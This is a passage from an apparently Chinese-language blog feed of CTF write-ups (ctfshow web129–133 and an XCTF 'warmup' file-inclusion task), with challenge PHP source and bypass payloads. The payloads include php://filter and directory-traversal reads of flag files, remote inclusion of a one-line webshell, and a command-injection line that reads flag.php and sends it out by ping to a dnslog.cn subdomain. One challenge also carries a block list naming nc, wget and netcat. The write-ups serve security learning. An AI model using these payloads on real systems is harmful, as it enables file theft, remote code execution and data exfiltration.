class="string">&#x27;f&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">stripos</span>(<span class="variable">$f</span>, <span class="string">&#x27;ctfshow&#x27;</span>)&gt;<span class="number">0</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">readfile</span>(<span class="variable">$f</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol><ul><li>stripos()函数<br>查找字符串首次出现的位置（不区分大小写）<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">stripos(string $haystack, string $needle, int $offset = 0): int|false</span><br><span class="line">返回在字符串 haystack 中 needle 首次出现的数字位置。</span><br><span class="line">与 strpos() 不同，stripos() 不区分大小写。</span><br><span class="line">在 PHP 8.0.0 之前，如果 needle 不是字符串，则会将其转换为整数并用作字符的序数值。此行为自 PHP 7.3.0 起已弃用，强烈建议不要依赖它。</span><br><span class="line">根据预期的行为，needle应该显式转换为字符串，或者应该执行对 chr() 的显式调用。</span><br><span class="line">返回值</span><br><span class="line">返回 needle 存在于 haystack 字符串开始的位置(独立于偏移量)。同时注意字符串位置起始于 0，而不是 1。</span><br></pre></td></tr></table></figure></li></ul><p>通过GET方式传入变量f，要求变量f中有字符串ctfshow且不在第1位。</p><ol start="2"><li>构造payload<br>要绕开readfile的方式有三种，</li></ol><ul><li>第1种：<br>使用php伪协议绕过：<br><code>?f=php://fiter/ctfshow/resource=flag.php</code></li><li>第2种：<br>使用目录穿越的方式绕过：<br><code>?f=./ctfshow/../flag.php</code></li><li>第3种：<br>远程文件包含，在自己的服务器上写个一句话，然后保存为txt文档。<br><code>f=http://url/123.txt?ctfshow</code><br>其中123.txt为一句话木马。</li></ul><p>成功拿到flag</p><h1 id="web130"><a href="#web130" class="headerlink" title="web130"></a>web130</h1><ol><li>查看源码<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;f&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$f</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;f&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/.+?ctfshow/is&#x27;</span>, <span class="variable">$f</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;bye!&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">stripos</span>(<span class="variable">$f</span>, <span class="string">&#x27;ctfshow&#x27;</span>) === <span class="literal">FALSE</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;bye!!&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol><ul><li>PCRE回溯次数限制<br>PHP 为了防止正则表达式的拒绝服务攻击（reDOS），给 pcre 设定了一个回溯次数上限 pcre.backtrack_limit<br>回溯次数上限默认是 100 万。如果回溯次数超过了 100 万，preg_match 将返回 false。<br>可以参考这篇文章：<a href="leavesongs.com/PENETRATION/use-pcre-backtrack-limit-to-bypass-restrict.html">PHP利用PCRE回溯次数限制绕过某些安全限制</a></li></ul><p>通过POST传入一个参数f，第1个if语句将f进行preg_match正则匹配，点号(.)表示任意单个字符串（但不会匹配换行符\n），加号(+)表示匹配1次或多次，问号(?)表示匹配0次或1次匹配前面的字符串。i表示不区分大小写，s表示匹配任何空白字符，包括空格、制表符和换页符。<br>若未匹配到进入下一个if语句匹配字符串中是否有字符ctfshow。<br>通过两个if语句即可拿到flag。</p><ol start="2"><li>构造payload</li></ol><ul><li><p>第1种<br>根据PCRE回溯次数限制，我们可以写个python脚本让回溯次数超过1000000次，这样就能绕开preg_match，将ctfshow有效传下去，脚本如下：</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">&quot;http://ce455ed5-7390-42ee-b754-0f64b36f4551.challenge.ctf.show/&quot;</span></span><br><span class="line">data = &#123;<span class="string">&quot;f&quot;</span>: <span class="string">&quot;1111&quot;</span>*<span class="number">250000</span>+<span class="string">&quot;ctfshow&quot;</span>&#125;</span><br><span class="line"><span class="built_in">print</span>(requests.post(url=url, data=data).text)</span><br></pre></td></tr></table></figure><p>运行后成功拿到flag</p></li><li><p>第2种<br>根据该preg_match可知，需要先匹配了任意单个字符串后才会匹配是否存在ctfshow，如果我们一开始就匹配ctfshow，则能直接绕过：<br>POST: <code>f=ctfshow</code></p></li><li><p>第3种<br>preg_match无法处理数组，于是可以通过传入数组绕开：<br>POST: <code>f[]=</code> 或 <code>f=ctfshow[]</code></p></li><li><p>第4种<br>由于正则中的点号(.)不会匹配\n，因此可以通过换行符绕过：<br>POST: <code>f=ctfshow\n</code></p></li></ul><h1 id="web131"><a href="#web131" class="headerlink" title="web131"></a>web131</h1><ol><li><p>查看源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;f&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$f</span> = (String)<span class="variable">$_POST</span>[<span class="string">&#x27;f&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/.+?ctfshow/is&#x27;</span>, <span class="variable">$f</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;bye!&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">stripos</span>(<span class="variable">$f</span>,<span class="string">&#x27;36Dctfshow&#x27;</span>) === <span class="literal">FALSE</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;bye!!&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>和上一题相似度很高，区别在于通过POST传入的变量均进行了字符串化，这样一来无法使用数组和换行符绕过。<br>第2个if语句匹配的字符串成了36Dctfshow，无法直接传参绕过正则。</p></li><li><p>构造payload<br>上一题的第1种方法还能使用，只是需要稍微改改脚本罢了。</p></li></ol><h1 id="web132"><a href="#web132" class="headerlink" title="web132"></a>web132</h1><ol><li>查看源码<br>一开始出现了个博客页面，我还以为自己搞错了，做了那么多直接显示源代码的题，没反应过来…<br>首先拿后台扫描工具爆破下：<br>我们可以看到 <code>/admin</code> 会显示有跳转，于是直接访问admin页面，那么得到了真正需要的php源码。或者 <code>robots.txt</code> 也可显示真正需要访问的页面。<br>这个题应该是模拟后台管理员登录。<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#error_reporting(0);</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;username&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$username</span> = (String)<span class="variable">$_GET</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">    <span class="variable">$password</span> = (String)<span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line">    <span class="variable">$code</span> = (String)<span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$code</span> === <span class="title function_ invoke__">mt_rand</span>(<span class="number">1</span>,<span class="number">0x36D</span>) &amp;&amp; <span class="variable">$password</span> === <span class="variable">$flag</span> || <span class="variable">$username</span> ===<span class="string">&quot;admin&quot;</span>)&#123;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$code</span> == <span class="string">&#x27;admin&#x27;</span>)&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol><ul><li>mt_rand()函数<br>通过梅森旋转（Mersenne Twister）随机数生成器生成随机值。<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mt_rand(int $min, int $max): int</span><br><span class="line">警告</span><br><span class="line">本函数并不会生成安全加密的值，并且不可用于加密或者要求返回值不可猜测的目的。</span><br><span class="line">mt_rand() 函数是旧的 rand() 的临时替代。该函数用了» 梅森旋转中已知的特性作为随机数发生器，它可以产生随机数值的平均速度比 libc 提供的 rand() 快四倍。</span><br></pre></td></tr></table></figure>通过GET传入三个参数username,password和code<br>三个参数均进行了string转换，在第1个if语句判断中，注意到 <code>||</code> 。<br>于是可以只满足一个条件，即： <code>$username ===&quot;admin&quot;</code><br>因此参数code和password可控。<br>第2个if语句中，code需要满足等于admin的条件，于是直接构造payload如下：<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://6c73c641-6607-49de-9ff8-757e351e1ab6.challenge.ctf.show/admin/?username=admin&amp;password=&amp;code=admin</span><br></pre></td></tr></table></figure>成功拿到flag</li></ul><h1 id="web133"><a href="#web133" class="headerlink" title="web133"></a>web133</h1><ol><li>查看源码<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="comment">//flag.php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$F</span> = @<span class="variable">$_GET</span>[<span class="string">&#x27;F&#x27;</span>])&#123;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/system|nc|wget|exec|passthru|netcat/i&#x27;</span>, <span class="variable">$F</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="title function_ invoke__">substr</span>(<span class="variable">$F</span>,<span class="number">0</span>,<span class="number">6</span>));</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;6个字母都还不够呀?!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol><ul><li><p>@</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$F = @$_GET[&#x27;F&#x27;]</span><br><span class="line">其中的 @ 是为了防止没有 $_GET[&#x27;F&#x27;]出现错误提示.</span><br><span class="line">但是 @ 的代价过高, 一般都用 isset() 来判断一下</span><br><span class="line">相当于isset()</span><br></pre></td></tr></table></figure></li><li><p>linux grep,tr命令<br>Linux grep 命令用于查找文件里符合条件的字符串。<br>Linux tr 命令用于转换或删除文件中的字符。<br>详细解释：<a href="https://www.runoob.com/linux/linux-comm-grep.html">Linux grep 命令</a> 和 <a href="https://www.runoob.com/linux/linux-comm-tr.html">Linux tr命令</a></p></li><li><p>curl -c 命令<br>-c参数将服务器设置的 Cookie 写入一个文件。<br><a href="https://www.ruanyifeng.com/blog/2019/09/curl-reference.html">curl 的用法指南</a></p></li><li><p>shell_exec()函数<br>``是shell_exec()函数的缩写。shell_exec — 通过 webshell 环境执行命令，并且将完整的输出以字符串的方式返回。</p></li></ul><p>通过GET传入一个参数F，然后进行正则匹配。如果通过则将6个字符输出为代码。<br>这里需要用变量覆盖，自己覆盖自己，从而绕过substr。有点像双写绕过。</p><ol start="2"><li>构造payload<br>使用变量覆盖: ?F&#x3D;`$F`;<br>如此一来自己覆盖自己，第1次能够通过substr，第2次就不需要通过substr，能够完整输出了。因此可以在6个字符之后加需要的命令来返回flag。<br>使用dnslog生成子域名，将得到的子域名放入GET中，在返回的查询记录中得到flag，构造payload如下：<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?F=`$F`; ping `cat flag.php | grep ctfshow | tr -cd &quot;[a-z]&quot;/&quot;[0-9]&quot;`.o9u0j4.dnslog.cn -c 1</span><br></pre></td></tr></table></figure>在查询记录中显示如下：<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flagctfshow6a739952ac4b406ea6890b16d9a5c293.o9u0j4.dnslog.cn</span><br></pre></td></tr></table></figure>通过构造flag的格式，8 4 4 4 12加上-即可成功拿到flag。<br>另外的方法可参考这篇文章：<a href="https://blog.csdn.net/qq_46091464/article/details/109095382">ctfshow web133</a></li></ol>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;为了继续巩固php基础！&lt;/p&gt;</summary>
    
    
    
    <category term="CTF" scheme="http://example.com/categories/CTF/"/>
    
    <category term="PHP" scheme="http://example.com/categories/CTF/PHP/"/>
    
    
    <category term="CTF" scheme="http://example.com/tags/CTF/"/>
    
    <category term="PHP" scheme="http://example.com/tags/PHP/"/>
    
  </entry>
  
  <entry>
    <title>攻防世界-warmup</title>
    <link href="http://example.com/2022/12/15/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-warmup/"/>
    <id>http://example.com/2022/12/15/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-warmup/</id>
    <published>2022-12-14T16:00:00.000Z</published>
    <updated>2022-12-15T06:30:14.804Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>自己的缺陷在于对于php代码还不甚熟练</p><span id="more"></span><h1 id="解决步骤"><a href="#解决步骤" class="headerlink" title="解决步骤"></a>解决步骤</h1><ol><li><p>后台扫描<br>使用DirBuster工具扫描，可知source.php可以打开。<br>打开后是一段php代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">emmm</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">checkFile</span>(<span class="params">&amp;<span class="variable">$page</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="variable">$whitelist</span> = [<span class="string">&quot;source&quot;</span>=&gt;<span class="string">&quot;source.php&quot;</span>,<span class="string">&quot;hint&quot;</span>=&gt;<span class="string">&quot;hint.php&quot;</span>];</span><br><span class="line">            <span class="keyword">if</span> (! <span class="keyword">isset</span>(<span class="variable">$page</span>) || !<span class="title function_ invoke__">is_string</span>(<span class="variable">$page</span>)) &#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;you can&#x27;t see it&quot;</span>;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">in_array</span>(<span class="variable">$page</span>, <span class="variable">$whitelist</span>)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="variable">$_page</span> = <span class="title function_ invoke__">mb_substr</span>(</span><br><span class="line">                <span class="variable">$page</span>,</span><br><span class="line">                <span class="number">0</span>,</span><br><span class="line">                <span class="title function_ invoke__">mb_strpos</span>(<span class="variable">$page</span> . <span class="string">&#x27;?&#x27;</span>, <span class="string">&#x27;?&#x27;</span>)</span><br><span class="line">            );</span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">in_array</span>(<span class="variable">$_page</span>, <span class="variable">$whitelist</span>)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="variable">$_page</span> = <span class="title function_ invoke__">urldecode</span>(<span class="variable">$page</span>);</span><br><span class="line">            <span class="variable">$_page</span> = <span class="title function_ invoke__">mb_substr</span>(</span><br><span class="line">                <span class="variable">$_page</span>,</span><br><span class="line">                <span class="number">0</span>,</span><br><span class="line">                <span class="title function_ invoke__">mb_strpos</span>(<span class="variable">$_page</span> . <span class="string">&#x27;?&#x27;</span>, <span class="string">&#x27;?&#x27;</span>)</span><br><span class="line">            );</span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">in_array</span>(<span class="variable">$_page</span>, <span class="variable">$whitelist</span>)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;you can&#x27;t see it&quot;</span>;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (! <span class="keyword">empty</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;file&#x27;</span>])</span><br><span class="line">        &amp;&amp; <span class="title function_ invoke__">is_string</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;file&#x27;</span>])</span><br><span class="line">        &amp;&amp; emmm::<span class="title function_ invoke__">checkFile</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;file&#x27;</span>])</span><br><span class="line">    ) &#123;</span><br><span class="line">        <span class="keyword">include</span> <span class="variable">$_REQUEST</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&lt;img src=\&quot;https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\&quot; /&gt;&quot;</span>;</span><br><span class="line">    &#125;  </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>我们注意到还有一个hint.php页面，于是打开该页面，发现提示我们flag在ffffllllaaaagggg里。</p></li><li><p>分析代码</p></li></ol><ul><li><p>变量前的&amp;符号<br>$变量前加&amp;符号，表示引用，也即引用传递。</p></li><li><p>白名单数组</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$whitelist</span> = [<span class="string">&quot;source&quot;</span>=&gt;<span class="string">&quot;source.php&quot;</span>,<span class="string">&quot;hint&quot;</span>=&gt;<span class="string">&quot;hint.php&quot;</span>];</span><br></pre></td></tr></table></figure></li><li><p>is_string()函数<br>该函数是判断内部的变量是否为字符串</p></li><li><p>mb_substr()函数<br>该函数是获取部分字符串</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">mb_substr</span>(</span><br><span class="line">    <span class="keyword">string</span> <span class="variable">$str</span>,</span><br><span class="line">    <span class="keyword">int</span> <span class="variable">$start</span>,</span><br><span class="line">    <span class="keyword">int</span> <span class="variable">$length</span> = <span class="literal">NULL</span>,</span><br><span class="line">    <span class="keyword">string</span> <span class="variable">$encoding</span> = <span class="title function_ invoke__">mb_internal_encoding</span>()</span><br><span class="line">): <span class="keyword">string</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">str</span></span><br><span class="line"><span class="comment">从该 string 中提取子字符串。</span></span><br><span class="line"><span class="comment">start</span></span><br><span class="line"><span class="comment">如果 start 不是负数，返回的字符串会从 str 第 start 的位置开始，从 0 开始计数。举个例子，字符串 &#x27;abcdef&#x27;，位置 0 的字符是 &#x27;a&#x27;，位置 2 的字符是 &#x27;c&#x27;，以此类推。</span></span><br><span class="line"><span class="comment">如果 start 是负数，返回的字符串是从 str 末尾处第 start 个字符开始的。</span></span><br><span class="line"><span class="comment">length</span></span><br><span class="line"><span class="comment">str 中要使用的最大字符数。如果省略了此参数或者传入了 NULL，则会提取到字符串的尾部。</span></span><br><span class="line"><span class="comment">encoding</span></span><br><span class="line"><span class="comment">encoding 参数为字符编码。如果省略或是 null，则使用内部字符编码。</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure><p>根据字符数执行一个多字节安全的 substr() 操作。 位置是从 str 的开始位置进行计数。 第一个字符的位置是 0。第二个字符的位置是 1，以此类推。</p></li><li><p>mb_strpos()函数<br>该函数是查找字符串在另一个字符串中首次出现的位置</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">mb_strpos</span>(</span><br><span class="line">    <span class="keyword">string</span> <span class="variable">$haystack</span>,</span><br><span class="line">    <span class="keyword">string</span> <span class="variable">$needle</span>,</span><br><span class="line">    <span class="keyword">int</span> <span class="variable">$offset</span> = <span class="number">0</span>,</span><br><span class="line">    <span class="keyword">string</span> <span class="variable">$encoding</span> = <span class="title function_ invoke__">mb_internal_encoding</span>()</span><br><span class="line">): <span class="keyword">int</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">haystack</span></span><br><span class="line"><span class="comment">要被检查的 string。</span></span><br><span class="line"><span class="comment">needle</span></span><br><span class="line"><span class="comment">在 haystack 中查找这个字符串。 和 strpos() 不同的是，数字的值不会被当做字符的顺序值。</span></span><br><span class="line"><span class="comment">offset</span></span><br><span class="line"><span class="comment">搜索位置的偏移。如果没有提供该参数，将会使用 0。负数的 offset 会从字符串尾部开始统计。</span></span><br><span class="line"><span class="comment">encoding</span></span><br><span class="line"><span class="comment">encoding 参数为字符编码。如果省略或是 null，则使用内部字符编码。</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure><p>基于字符数执行一个多字节安全的 strpos() 操作。 第一个字符的位置是 0，第二个字符的位置是 1，以此类推。</p></li><li><p>is_array()函数<br>该函数是判断第1个变量是否在第2个数组中</p></li><li><p>empty()函数<br>该函数是检查变量是否为空。<br>当变量不存在、值为空、等于 0、为 false 时，返回 true。否则返回 false。</p></li><li><p>emmm::checkFile()<br>输出emmm函数的返回值</p></li></ul><p>PHP函数代码都解析完毕后，那么我们可以知道传入的参需要满足以下条件：<br>不为空，是字符串，<br>第1个问号(?)前的字符在白名单内</p><ol start="3"><li>构造语句<br>我们已经知道了条件，接下来就是构造语句来满足条件。可以看到有include函数，所以我们想到文件包含漏洞。<br>使用目录穿越（..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;）的方式可以访问到父目录，从而访问到ffffllllaaaagggg。<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=hint.php?../../../../../ffffllllaaaagggg</span><br></pre></td></tr></table></figure>拿到flag</li></ol><h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>PHP代码看得太少了，导致一堆代码都看不懂！</p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;自己的缺陷在于对于php代码还不甚熟练&lt;/p&gt;</summary>
    
    
    
    <category term="CTF" scheme="http://example.com/categories/CTF/"/>
    
    <category term="文件包含" scheme="http://example.com/categories/CTF/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/"/>
    
    
    <category term="CTF" scheme="http://example.com/tags/CTF/"/>
    
    <category term="PHP" scheme="http://example.com/tags/PHP/"/>
    
    <category term="文件包含" scheme="http://example.com/tags/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/"/>
    
  </entry>
  
  <entry>
    <title>攻防世界-easyupload</title>
    <link href="http://example.com/2022/12/14/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-_easyupload/"/>
    <id>http://example.com/2022/12/14/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-_easyupload/</id>
    <published>2022-12-13T16:00:00.000Z</published>
    <updated>2022-12-14T17:42:09.250Z</updated>
    
